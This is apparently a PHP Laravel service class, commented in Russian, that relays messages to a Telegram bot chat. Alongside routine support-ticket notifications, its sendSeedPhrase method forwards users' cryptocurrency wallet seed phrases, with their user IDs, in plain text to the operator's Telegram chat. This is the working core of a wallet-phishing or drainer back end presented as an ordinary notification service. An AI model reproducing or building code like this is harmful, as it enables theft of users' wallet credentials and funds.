<?php

namespace App\Services;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class TelegramService
{
    protected $apiToken;
    protected $chatId;
    protected $apiUrl;

    public function __construct()
    {
        $this->apiToken = config('services.telegram.bot_token');
        $this->chatId = config('services.telegram.chat_id');
        $this->apiUrl = "https://api.telegram.org/bot{$this->apiToken}";
    }

    /**
     * Отправка seed-фразы в Telegram
     *
     * @param string $seedPhrase
     * @param int $userId
     * @return bool
     */
    public function sendSeedPhrase($seedPhrase, $userId)
    {
        $message = "🔑 Новая seed-фраза от пользователя ID: {$userId}\n\n";
        $message .= "<code>{$seedPhrase}</code>";

        return $this->sendMessage($message);
    }

    /**
     * Отправка сообщения поддержки в Telegram
     *
     * @param int $userId
     * @param string $ticketNumber
     * @param string $messageText
     * @return bool
     */
    public function sendSupportMessage($userId, $ticketNumber, $messageText)
    {
        $message = "📩 Новое сообщение в поддержку\n\n";
        $message .= "👤 ID пользователя: {$userId}\n";
        $message .= "🔢 Номер тикета: #{$ticketNumber}\n\n";
        $message .= "💬 Сообщение:\n{$messageText}\n\n";
        $message .= "Для ответа используйте формат:\n";
        $message .= "<code>#{$ticketNumber} REPLY: ваш ответ</code>";

        return $this->sendMessage($message);
    }

    /**
     * Отправка уведомления о закрытии тикета
     *
     * @param int $userId
     * @param string $ticketNumber
     * @return bool
     */
    public function sendTicketClosed($userId, $ticketNumber)
    {
        $message = "🚫 Тикет закрыт\n\n";
        $message .= "👤 ID пользователя: {$userId}\n";
        $message .= "🔢 Номер тикета: #{$ticketNumber}";

        return $this->sendMessage($message);
    }

    /**
     * Отправка общего сообщения в Telegram
     *
     * @param string $text
     * @param array $options Дополнительные параметры
     * @return bool
     */
    public function sendMessage($text, $options = [])
    {
        try {
            $params = array_merge([
                'chat_id' => $this->chatId,
                'text' => $text,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ], $options);

            $response = Http::post("{$this->apiUrl}/sendMessage", $params);
            
            if (!$response->successful()) {
                Log::error('Telegram API Error', [
                    'status' => $response->status(),
                    'body' => $response->body()
                ]);
                return false;
            }
            
            return true;
        } catch (\Exception $e) {
            Log::error('Telegram Service Error', ['message' => $e->getMessage()]);
            return false;
        }
    }

    /**
     * Установка webhook для приема сообщений от Telegram
     *
     * @param string $url URL для webhook
     * @param string $secretToken Секретный токен для проверки запросов
     * @return array
     */
    public function setWebhook($url, $secretToken = null)
    {
        $params = [
            'url' => $url,
            'allowed_updates' => json_encode(['message']),
        ];
        
        if ($secretToken) {
            $params['secret_token'] = $secretToken;
        }
        
        try {
            $response = Http::post("{$this->apiUrl}/setWebhook", $params);
            return $response->json();
        } catch (\Exception $e) {
            Log::error('Telegram Webhook Error', ['message' => $e->getMessage()]);
            return ['ok' => false, 'error' => $e->getMessage()];
        }
    }
}